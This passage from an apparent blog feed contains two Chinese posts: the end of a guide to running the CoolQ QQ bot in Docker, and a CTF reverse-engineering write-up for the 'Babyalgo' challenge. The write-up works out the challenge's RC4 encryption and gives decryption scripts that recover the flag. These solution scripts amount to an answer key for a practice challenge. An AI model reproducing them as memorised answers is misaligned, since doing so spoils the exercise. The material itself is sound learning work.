pro</code>。</p><p>air版本目前免费，但是相对应的，功能就比pro少，比如一些发图片、发语音的功能就需要pro版才可以实现。</p><p>酷Q可以在Mac、Linux、Windows平台上运行，在Windows上主要是运行其exe文件，而在Mac和Linux上，则可以用docker的形式来运行酷Q，这也就意味着，<strong>酷Q可以挂到服务器上24小时运行</strong>。</p><p>酷Q有它自己的社区，在社区里面可以下载到各种酷Q使用者自己开发的插件，当然有些高质量插件也是要收费的，不过还是免费、开源的插件居多。</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/ev007al.png" alt></p><h1 id="0x02-安装酷Q"><a href="#0x02-安装酷Q" class="headerlink" title="0x02 安装酷Q"></a>0x02 安装酷Q</h1><p>由于我打算把酷Q挂到服务器上，所以这里我下载的docker版本。</p><p>由于酷Q docker还是挺大的，我用docker的默认镜像下了许久也才下载了一小部分，所以这里先用一下docker的加速器。</p><h2 id="使用docker镜像加速器"><a href="#使用docker镜像加速器" class="headerlink" title="使用docker镜像加速器"></a>使用docker镜像加速器</h2><p>可以选用的加速器有网易的、阿里云的、七牛云的 等等等等…</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">网易：https://hub-mirror.c.163.com/</span><br><span class="line"></span><br><span class="line">阿里云：https://&lt;你的ID&gt;.mirror.aliyuncs.com</span><br><span class="line"></span><br><span class="line">七牛云加速器：https://reg-mirror.qiniu.com</span><br></pre></td></tr></table></figure><p><a href="https://cr.console.aliyun.com/cn-hangzhou/instances/mirrors" target="_blank" rel="noopener">阿里云镜像加速地址</a></p><p>获取到加速器地址以后修改配置文件。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vi /etc/docker/daemon.json</span><br></pre></td></tr></table></figure><p>这里以使用网易加速器为例</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo mkdir -p /etc/docker</span><br><span class="line">sudo tee /etc/docker/daemon.json &lt;&lt;-<span class="string">'EOF'</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"registry-mirrors"</span>: [<span class="string">"https://hub-mirror.c.163.com/"</span>]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure><p>保存退出</p><p>重启docker服务</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">service docker restart</span><br></pre></td></tr></table></figure><h2 id="拉取并安装酷Q-docker"><a href="#拉取并安装酷Q-docker" class="headerlink" title="拉取并安装酷Q docker"></a>拉取并安装酷Q docker</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull coolq/wine-coolq <span class="comment">#拉取酷Qdocker,时间可能会久一些</span></span><br></pre></td></tr></table></figure><p>拉取成功以后输入<code>docker images</code>可以看到<code>coolq/wine-coolq</code>的实例</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkdir /root/coolq-data <span class="comment"># 任意路径均可,创建一个文件夹用于存放酷Q数据</span></span><br></pre></td></tr></table></figure><p>然后运行酷Q镜像，由于要安装到服务器上，所以选择后台运行的方式。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run --name=coolq -d -p 8080:9000 -p 5700:5700 -v /root/coolq-data:/home/user/coolq -e VNC_PASSWD=12345678 -e COOLQ_ACCOUNT=123456 coolq/wine-coolq</span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>-p 8080:9000</td><td>把8080改到任意端口，用于使用浏览器连接docker的桌面</td></tr><tr><td>-p 5700:5700</td><td>把前一个5700改成任意端口，用于连接酷Q的HTTP API</td></tr><tr><td>-v /root/coolq-data</td><td>改成之前新建的文件夹，用于做文件夹储存位置的映射</td></tr><tr><td>VNC_PASSWD=12345678</td><td>可以自己设置密码，用于连接docker的远程桌面</td></tr><tr><td>COOLQ_ACCOUNT=123456</td><td>登录的机器人的QQ号</td></tr></tbody></table><p>运行命令以后，当看到<code>[CQDaemon] Started CoolQ</code>即为运行成功。</p><p>这时候访问<code>http://你的服务器IP:你的端口</code>即可看到noVNC登陆，输入刚刚设置的VNC密码即可登陆VNC看到docker远程桌面。<strong>如果访问不成功的话, 可以看后面的 0x04常见问题:</strong></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200712012507.png" alt></p><p>然后就是登陆你的机器人QQ了</p><p>待会可能会出现这个提示</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200712013016.png" alt></p><p>选择<code>拒绝本次网页验证</code>即可</p><p>登上以后可以看到自己机器人QQ的头像，会以悬浮窗的形式出现。</p><p>右键悬浮窗以后就会有各种功能，悬浮窗默认显示消息速度，也可以自行设置显示什么。</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200712013245.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200712013623.png" alt></p><p>如果不小心把这个显示悬浮窗的对勾给勾掉的话，也可以通过右键点击这个蓝色的圈来替代悬浮窗。</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200712013651.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/ev007bl.png" alt></p><h1 id="0x03-安装插件"><a href="#0x03-安装插件" class="headerlink" title="0x03 安装插件"></a>0x03 安装插件</h1><p>社区里面下载到的插件大都是cpk文件。</p><p>将下载到的插件存放于/coolq/app/文件夹内即可。</p><p>我尝试了一下自带的图灵机器人插件，对话什么的体验都挺棒，可惜只能免费体验3天。</p><h2 id="安装CQHTTP核心插件"><a href="#安装CQHTTP核心插件" class="headerlink" title="安装CQHTTP核心插件"></a>安装CQHTTP核心插件</h2><p>有一个插件名为CQHTTP，这应该算是一个核心插件吧，有了它就可以自己开发各种插件了，它提供较为全面的API，包括私聊、群聊、加好友、群踢人、群禁言等等等等…</p><p><a href="https://github.com/richardchien/coolq-http-api/releases" target="_blank" rel="noopener">CQHTTP下载地址</a></p><p>将其放到/coolq/app/文件夹以后来到docker远程桌面进行启用。</p><p>右键悬浮窗-应用管理-找到HTTP API-启用。</p><p>启用以后会在<code>/coolq/data/app/io.github.richardchien.coolqhttpapi/config/</code>文件夹内生成<code>你登陆的QQ号.json</code>文件。</p><p>编辑该文件，在<code>&quot;post_url&quot;</code>一项后面填入<code>http://127.0.0.1:你前面设置的HTTP API的端口(默认5700)</code>。</p><p>以我前面设置的 -p 5700:5700为例，那么我填好后的形式应该为<code>&quot;post_url&quot;: &quot;http://127.0.0.1:5700&quot;</code></p><p>填好以后保存退出。</p><p>其API文档如下:</p><p><a href="https://cqhttp.cc/docs/4.15/#/API" target="_blank" rel="noopener">HTTP API文档</a></p><p>可以写个py脚本测试一下。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">        <span class="string">'user_id'</span>:<span class="number">1125214419</span>,</span><br><span class="line">        <span class="string">'message'</span>:<span class="string">'hhhhh'</span>,</span><br><span class="line">        <span class="string">'auto_escape'</span>:<span class="literal">False</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">api_url = <span class="string">'http://127.0.0.1:5700/send_private_msg'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> requests.post(api_url,data)</span><br></pre></td></tr></table></figure><p>发现返回<code>&lt;Response [200]&gt;</code>,而且我的大号收到了来自QQ机器人的<code>hhhhh</code>消息，这个应该是需要加了好友才行。</p><p>其他API也可以自行测试。</p><p><strong>不过发群聊有可能会因为刚挂到服务器，算是异地登录而失败，即便返回的也是200状态码，但依然收不到消息。</strong></p><h2 id="其他插件"><a href="#其他插件" class="headerlink" title="其他插件"></a>其他插件</h2><p>粗略逛了逛社区，发现几个还是挺不错的免费插件</p><p><a href="https://cqp.cc/t/27551" target="_blank" rel="noopener">smile娱乐 插件</a></p><p><a href="https://cqp.cc/t/50939" target="_blank" rel="noopener">PIXIV查询</a></p><p><a href="https://cqp.cc/t/49946" target="_blank" rel="noopener">关注早晚安</a></p><p>还有挺多宠物系统、还有一些游戏系统，自行发现吧。</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/ev008al.png" alt></p><h1 id="0x04-常见问题"><a href="#0x04-常见问题" class="headerlink" title="0x04 常见问题"></a>0x04 常见问题</h1><h2 id="浏览器中访问docker远程桌面失败"><a href="#浏览器中访问docker远程桌面失败" class="headerlink" title="浏览器中访问docker远程桌面失败"></a>浏览器中访问docker远程桌面失败</h2><h3 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述:"></a>问题描述:</h3><p>访问<code>http://你的服务器IP:你的端口</code>失败，但是通过localhost是可以正常访问的</p><h3 id="问题解决方案"><a href="#问题解决方案" class="headerlink" title="问题解决方案:"></a>问题解决方案:</h3><p>由于通过localhost可以正常访问，说明不是部署问题，那么考虑到应该是服务器的端口是禁止访问的。</p><p>以阿里云服务器为例:可以在控制台打开对应端口，具体操作看下面参考链接</p><p><a href="https://yq.aliyun.com/articles/701181" target="_blank" rel="noopener">参考链接</a></p><h2 id="安装好的插件在docker远程桌面显示不全"><a href="#安装好的插件在docker远程桌面显示不全" class="headerlink" title="安装好的插件在docker远程桌面显示不全"></a>安装好的插件在docker远程桌面显示不全</h2><h3 id="问题描述-1"><a href="#问题描述-1" class="headerlink" title="问题描述:"></a>问题描述:</h3><p>安装好的插件，在docker远程桌面显示不全，总是缺右侧的一部分，导致许多插件无法正常使用(无法按到如 保存配置 等按钮)，把插件往左拖拽依然显示不全。</p><p>比如 smile娱乐 插件：</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200712020750.png" alt></p><p>只能显示到这样，拖拽到左侧也依然只能显示这些。</p><p>而完整的插件界面应该是这样的。</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200712021439.png" alt></p><p>这样就导致这个插件无法保存、无法关闭(只能靠重启docker…555)而影响了插件的正常使用。</p><h3 id="问题解决方案-1"><a href="#问题解决方案-1" class="headerlink" title="问题解决方案:"></a>问题解决方案:</h3><p>这个问题困扰我好几天了，各种Google也无果，酷Q社区的求助帖也看了好多，也没有对应症状。。。而且酷Q社区发求助帖需要权限…</p><p>直到昨天我突发灵感，会不会和docker远程桌面的分辨率有关呢？这个远程桌面分辨率确实有点小。</p><p>按照灵感，我通过命令行的形式设置了分辨率</p><p>在docker远程桌面启动命令行</p><p>通过命令<code>xrandr</code>查看支持的分辨率。</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200712021706.png" alt></p><p>然后随便选一个吧，1024×768应该就可以，不需要太大。</p><p>由于1024×768是第一个，所以<code>xrandr -s 11</code>来选择第一个分辨率。</p><p>设置好分辨率以后，再打开那个插件的配置界面，就能完整显示了!</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/ev011al.png" alt></p><h1 id="0x05-写在最后"><a href="#0x05-写在最后" class="headerlink" title="0x05 写在最后"></a>0x05 写在最后</h1><h2 id="杂谈"><a href="#杂谈" class="headerlink" title="杂谈"></a>杂谈</h2><p>个人觉得开发一些插件用来完善自己的机器人是非常有趣的，<strong>可能我还是爱开发更多一点吧</strong>。</p><p>虽然这只是一个QQ机器人，跟ATRI这种高性能机器人还差得远呢。</p><p>但ATRI有可能是有生之年系列，或者有生之年世上已经有这样的机器人被生产制造出来了，但我可能买不起555</p><p>科技飞速发展，谁又能预料到未来是什么模样的呢?</p><p>也正是这种未知与神秘，才让生活充满了乐趣吧。</p><h2 id="ATRI-天下第一"><a href="#ATRI-天下第一" class="headerlink" title="ATRI 天下第一"></a>ATRI 天下第一</h2><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/ev010al.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/ev010bl.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/ev012bl.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/ev017al.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/ev021al.png" alt></p>]]></content>
      <categories>
        <category>随手小记</category>
      </categories>
  </entry>
  <entry>
    <title>忽略细节导致耗时较多的一道逆向题Babyalgo</title>
    <url>/2020/11/19/%E5%BF%BD%E7%95%A5%E7%BB%86%E8%8A%82%E5%AF%BC%E8%87%B4%E8%80%97%E6%97%B6%E8%BE%83%E5%A4%9A%E7%9A%84%E4%B8%80%E9%81%93%E9%80%86%E5%90%91%E9%A2%98Babyalgo/</url>
    <content><![CDATA[<p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/1.jpg" alt></p><a id="more"></a><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>早闻Nu1L出了一本《从0到1：CTFer成长之路》</p><p>今天逛BUU的时候发现多了一栏N1BOOK</p><p>点开做一下，发现第二题竟然被卡住了，输出的flag后面有不可见字符而且后五六个字符似乎没啥含义</p><p>折腾挺大一会才发现原来是因为忽略了一个细节…</p><p>耗时比我想象中的多，就当吸取不仔细的教训吧…</p><h1 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h1><p>来到main函数，可以看到程序定义了一个数组</p><p><strong>但是这里有一个导致我后期输出的flag一直有问题的细节</strong></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20201119182531.png" alt></p><p>可以看到…前一个还是<code>[rbp+var_2A]</code>，下一个就变成了<code>[rbp+var_28]</code>，也就是说<code>[rbp+var_29]</code>不见了…</p><p>后期我还纳闷…明明flag要求长度45,但为什么这个数组只有44长度…然后自己在最后补了个0…</p><p>根据常识可知<code>[rbp+var_29] = 0</code></p><p>继续分析，进行了一番变量、函数重命名以后得到如下反汇编结果</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20201119183123.png" alt></p><p>这是后来才知道的这个函数是RC4算法函数……</p><p>由于第一次见这个算法的时候没想起来这是RC4，我直接去看相关算法然后逆的</p><p>进去看看RC4函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">RC4</span><span class="params">(__int64 a1, __int64 input, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// ST08_8</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [rsp+20h] [rbp-110h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+128h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = a3;</span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_40067A((<span class="keyword">const</span> <span class="keyword">char</span> *)a1, (__int64)&amp;v5);</span><br><span class="line">  sub_400753((__int64)&amp;v5, (<span class="keyword">const</span> <span class="keyword">char</span> *)input, v3);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据<code>sub_40067A((const char *)a1, (__int64)&amp;v5);</code>所传入的参数可以知道，这是一个<strong>与我们输入的flag无关的函数</strong>。</p><p>具体分析了一下可以知道它的作用是根据main函数中的key去得到一个数组v5。</p><p>显然可以通过gdb调试(简便)或者自己写个算法(较麻烦,因为如果用python写，还要处理一些数据类型如unsigned int/unsigned __int8等的问题)得到这个数组v5。</p><p>得到的v5会传给<code>sub_400753((__int64)&amp;v5, (const char *)input, v3);</code>函数。</p><p>其作用是生成校验数组v3，也就是a3，也就是RC4的第三个参数RC4output，然后去与main函数中生成的数组进行对比校验，具体操作是通过<strong>一个数</strong>与我们的输入进行异或。</p><p><strong>分析一下，上一句中谈到的”一个数”，是与输入的flag无关的，即无论输入什么flag，只要满足flag.length == 45,在while循环中每次异或时循环次数相同时这个数都是固定不变的，那么可以将这些数(对应xor那句下断,它存在rdx中)提取出来作为一个数组，直接与main函数中的数组异或，便可得到flag。</strong></p><h1 id="0x02-思路"><a href="#0x02-思路" class="headerlink" title="0x02 思路"></a>0x02 思路</h1><h2 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h2><p>由于<code>sub_40067A</code>生成v5数组的过程是与输入无关的,那么可以通过gdb调试或者算法等方法生成v5，然后模拟<code>sub_400753</code>的逆过程生成flag。</p><h2 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h2><p>根据上面的分析，可以将<code>sub_400753</code>中与<code>input[i]</code>异或的那个数提取出来作为数组，与main函数的数组异或即可生成flag。</p><h2 id="思路三"><a href="#思路三" class="headerlink" title="思路三"></a>思路三</h2><p>后来才知道这个是RC4算法，有了密文(main数组即可转换为密文)和key(Nu1Lctf233)，即可生成明文flag。</p><p>不过网上各个RC4算法好像不太一致，在线网站生成结果也不太一样……</p><p>最终找到了一个能用的算法。</p><h1 id="0x03-解密脚本"><a href="#0x03-解密脚本" class="headerlink" title="0x03 解密脚本"></a>0x03 解密脚本</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">根据IDA的显示结果,得到的L是这样的。</span></span><br><span class="line"><span class="string">L = [0xc6,0x21,0xca,0xbf,0x51,0x43,0x37,0x31,</span></span><br><span class="line"><span class="string">     0x75,0xe4,0x8e,0xc0,0x54,0x6f,0x8f,0xee,</span></span><br><span class="line"><span class="string">     0xf8,0x5a,0xa2,0xc1,0xeb,0xa5,0x34,0x6d,</span></span><br><span class="line"><span class="string">     0x71,0x55,0x08,0x07,0xb2,0xa8,0x2f,0xf4,</span></span><br><span class="line"><span class="string">     0x51,0x8e,0x0c,0xcc,0x33,0x53,0x31,0x40,</span></span><br><span class="line"><span class="string">     0xd6,0xca,0xec,0xd4,0x00] #最后的0x00单纯是我为了凑够长度而补的...</span></span><br><span class="line"><span class="string">很可惜这不对,原因在于</span></span><br><span class="line"><span class="string">.text:00000000004009B1                 mov     [rbp+var_2D], 0CCh</span></span><br><span class="line"><span class="string">.text:00000000004009B5                 mov     [rbp+var_2C], 33h</span></span><br><span class="line"><span class="string">.text:00000000004009B9                 mov     [rbp+var_2B], 53h</span></span><br><span class="line"><span class="string">.text:00000000004009BD                 mov     [rbp+var_2A], 31h  #注意这里, 下一行直接是var_28,少了var_29</span></span><br><span class="line"><span class="string">.text:00000000004009C1                 mov     [rbp+var_28], 40h  #也即默认[rbp+var_29] = 0,并且以下都有一位移位</span></span><br><span class="line"><span class="string">.text:00000000004009C5                 mov     [rbp+var_27], 0D6h</span></span><br><span class="line"><span class="string">.text:00000000004009C9                 mov     [rbp+var_26], 0CAh</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">通过gdb调试或者正确分析了以后可以知道真正的L是这样的</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">L = [<span class="number">0xc6</span>,<span class="number">0x21</span>,<span class="number">0xca</span>,<span class="number">0xbf</span>,<span class="number">0x51</span>,<span class="number">0x43</span>,<span class="number">0x37</span>,<span class="number">0x31</span>,</span><br><span class="line">     <span class="number">0x75</span>,<span class="number">0xe4</span>,<span class="number">0x8e</span>,<span class="number">0xc0</span>,<span class="number">0x54</span>,<span class="number">0x6f</span>,<span class="number">0x8f</span>,<span class="number">0xee</span>,</span><br><span class="line">     <span class="number">0xf8</span>,<span class="number">0x5a</span>,<span class="number">0xa2</span>,<span class="number">0xc1</span>,<span class="number">0xeb</span>,<span class="number">0xa5</span>,<span class="number">0x34</span>,<span class="number">0x6d</span>,</span><br><span class="line">     <span class="number">0x71</span>,<span class="number">0x55</span>,<span class="number">0x08</span>,<span class="number">0x07</span>,<span class="number">0xb2</span>,<span class="number">0xa8</span>,<span class="number">0x2f</span>,<span class="number">0xf4</span>,</span><br><span class="line">     <span class="number">0x51</span>,<span class="number">0x8e</span>,<span class="number">0x0c</span>,<span class="number">0xcc</span>,<span class="number">0x33</span>,<span class="number">0x53</span>,<span class="number">0x31</span>,<span class="number">0x00</span>,</span><br><span class="line">     <span class="number">0x40</span>,<span class="number">0xd6</span>,<span class="number">0xca</span>,<span class="number">0xec</span>,<span class="number">0xd4</span>,]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">思路1:似乎略微麻烦一些</span></span><br><span class="line"><span class="string">gdb调试拿到sub_40067A的结果的第二个参数,即下方s</span></span><br><span class="line"><span class="string">然后模拟执行sub_400753</span></span><br><span class="line"><span class="string">其中异或过程为逆向过程</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">s = <span class="string">'0x4e	0xc4	0xf7	0x68	0x09	0x26	0x08	0x0e	0x92	0x2d	0x9a	0x1a	0x64	0xb0	0x21	0xa4	0x0b	0x5d	0xa2	0x22	0x4a	0xd4	0x1b	0x7e	0xfb	0x76	0x80	0x55	0x32	0x27	0x4f	0x1d	0xf8	0x8e	0x88	0x0f	0x5a	0x69	0xe6	0xb4	0x2f	0x9c	0x8c	0x89	0x36	0x11	0x38	0x8d	0x25	0xe7	0xcd	0x42	0x87	0xdf	0x78	0x4c	0x5f	0x9f	0x99	0xa3	0xcf	0xa1	0xb2	0xd0	0x9b	0x47	0x6a	0xd1	0xbc	0x5e	0x85	0x13	0x59	0x1e	0xc6	0x2c	0x52	0xb6	0x4b	0x65	0x2b	0x40	0xaa	0xeb	0x96	0x75	0x41	0x49	0xf0	0x10	0x6d	0xf4	0x81	0xde	0x0c	0xab	0x0d	0x5b	0xc3	0xd2	0xe5	0x90	0xc0	0x66	0x29	0x01	0x94	0x44	0x48	0x20	0x57	0x98	0x61	0x83	0x8f	0x15	0xae	0x28	0xef	0xa8	0x39	0xd7	0xc5	0x2a	0xba	0xec	0x4d	0x93	0x79	0xa9	0xfc	0xe9	0xbb	0xbd	0xaf	0x45	0xe8	0xdd	0x0a	0xdc	0x04	0xc8	0xca	0xe2	0xd5	0xb9	0x03	0x00	0xad	0xa7	0x8a	0x6c	0x58	0xf5	0xee	0x30	0xff	0xbe	0x7f	0x19	0x56	0x54	0xc2	0xf3	0x72	0xbf	0x63	0x17	0xfa	0x9d	0x77	0xd3	0x91	0x14	0x35	0x7d	0x18	0xb7	0x23	0x8b	0xa0	0xda	0x05	0x7b	0xe1	0x7a	0xa6	0x62	0x71	0xcc	0xd8	0x6b	0x9e	0xf6	0x3f	0x1f	0xb3	0x2e	0x5c	0x12	0x1c	0x3a	0x6f	0x73	0xf1	0x67	0xcb	0xac	0x3e	0x07	0x74	0xc1	0x86	0x51	0xc7	0x82	0xce	0x43	0xe4	0xe3	0xed	0x53	0x33	0x16	0xb5	0x06	0x37	0xdb	0xc9	0xf2	0x84	0x50	0x95	0xa5	0xd6	0x46	0xb8	0xfd	0x70	0x60	0x24	0x97	0x6e	0xb1	0x3c	0x02	0xea	0x3b	0x34	0xfe	0xd9	0xf9	0x7c	0xe0	0x3d	0x31'</span></span><br><span class="line">Li = s.split(<span class="string">'\t'</span>)</span><br><span class="line">v5 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> Li:</span><br><span class="line">    v5.append(int(i,<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">v6 = <span class="number">0</span></span><br><span class="line">v7 = <span class="number">0</span></span><br><span class="line">v8 = <span class="number">0</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#这是模拟sub_400753,其中异或为逆向过程</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">45</span>):</span><br><span class="line">    v6 = ((((((v6+<span class="number">1</span>)&gt;&gt;<span class="number">31</span>)&amp;<span class="number">0xffffffff</span>)&gt;&gt;<span class="number">24</span>) + v6 + <span class="number">1</span>)&amp;<span class="number">0xff</span>) - ((((v6+<span class="number">1</span>)&gt;&gt;<span class="number">31</span>)&amp;<span class="number">0xffffffff</span>)&gt;&gt;<span class="number">24</span>)</span><br><span class="line">    v3 = (((v7+(v5[v6]&amp;<span class="number">0xff</span>))&gt;&gt;<span class="number">31</span>)&amp;<span class="number">0xffffffff</span>)&gt;&gt;<span class="number">24</span></span><br><span class="line">    v7 = (v3+v7 + v5[v6])&amp;<span class="number">0xff</span> - v3</span><br><span class="line">    v5[v6],v5[v7] = v5[v7],v5[v6]</span><br><span class="line">    tmp = v5[((v5[v6] + v5[v7])&amp;<span class="number">0xff</span>)]&amp;<span class="number">0xff</span></span><br><span class="line">    flag += chr(L[i]^tmp)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">思路2:</span></span><br><span class="line"><span class="string">由于不论输入的flag是什么,只要满足输入长度=45,在sub_400753中input[i] ^ 某个数中这个某个数都是不变的</span></span><br><span class="line"><span class="string">固可以通过gdb调试，下断，依次读取其值(存在edx中),就能得到一个数组,然后去与我们的L进行异或</span></span><br><span class="line"><span class="string">即可得到flag</span></span><br><span class="line"><span class="string">得到的数组如下:</span></span><br><span class="line"><span class="string">这个方法算是思路1的进阶版吧,虽然也有点麻烦,但是对于应对一些算法比较晦涩难懂的情况还是很好用的</span></span><br><span class="line"><span class="string">(当然这个题算法....emmmm做完才知道是RC4....可以直接解密)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">ano = [<span class="number">0xa8</span>,<span class="number">0x10</span>,<span class="number">0xa8</span>,<span class="number">0xd0</span>,<span class="number">0x3e</span>,<span class="number">0x28</span>,<span class="number">0x4c</span>,<span class="number">0x44</span>,</span><br><span class="line">       <span class="number">0x06</span>,<span class="number">0xd5</span>,<span class="number">0xe0</span>,<span class="number">0x87</span>,<span class="number">0x0b</span>,<span class="number">0x09</span>,<span class="number">0xbc</span>,<span class="number">0x8f</span>,</span><br><span class="line">       <span class="number">0x8c</span>,<span class="number">0x2f</span>,<span class="number">0xd0</span>,<span class="number">0xf2</span>,<span class="number">0x98</span>,<span class="number">0xfa</span>,<span class="number">0x03</span>,<span class="number">0x02</span>,</span><br><span class="line">       <span class="number">0x2e</span>,<span class="number">0x31</span>,<span class="number">0x6d</span>,<span class="number">0x30</span>,<span class="number">0xd7</span>,<span class="number">0xda</span>,<span class="number">0x42</span>,<span class="number">0xc5</span>,</span><br><span class="line">       <span class="number">0x3f</span>,<span class="number">0xbd</span>,<span class="number">0x53</span>,<span class="number">0xf8</span>,<span class="number">0x5f</span>,<span class="number">0x34</span>,<span class="number">0x01</span>,<span class="number">0x72</span>,</span><br><span class="line">       <span class="number">0x29</span>,<span class="number">0xe1</span>,<span class="number">0xa2</span>,<span class="number">0x81</span>,<span class="number">0xa9</span>]</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(ano)):</span><br><span class="line">    flag += chr(ano[i]^L[i])</span><br><span class="line"><span class="keyword">print</span> flag</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">思路3:</span></span><br><span class="line"><span class="string">直接利用RC4解密</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4 <span class="keyword">as</span> rc4cipher</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_algorithm</span><span class="params">(encrypt_or_decrypt, data, key1)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> encrypt_or_decrypt == <span class="string">"encrypt"</span>:</span><br><span class="line">        key = bytes(key1)</span><br><span class="line">        enc = rc4cipher.new(key)</span><br><span class="line">        res = enc.encrypt(data.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">        res=base64.b64encode(res)</span><br><span class="line">        res = str(res)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">elif</span> encrypt_or_decrypt == <span class="string">"decrypt"</span>:</span><br><span class="line">        data = base64.b64decode(data)</span><br><span class="line">        key = bytes(key1)</span><br><span class="line">        enc = rc4cipher.new(key)</span><br><span class="line">        res = enc.decrypt(data)</span><br><span class="line">        res = str(res)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key = <span class="string">'Nu1Lctf233'</span></span><br><span class="line">text = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> L:</span><br><span class="line">    text += chr(i)</span><br><span class="line">res = base64.b64encode(text)</span><br><span class="line"><span class="keyword">print</span> rc4_algorithm(<span class="string">'decrypt'</span>, res, key)</span><br></pre></td></tr></table></figure><h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><p>细节很重要。</p><p>熟记各种常见算法会对逆向很有帮助。</p>]]></content>
      <categories>
        <category>逆向</category>
      </categories>
  </entry>
  <entry>
    <title>攻防世界-Pwn进阶区(1)</title>
    <url>/2019/11/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Pwn%E8%BF%9B%E9%98%B6%E5%8C%BA(1)/</url>
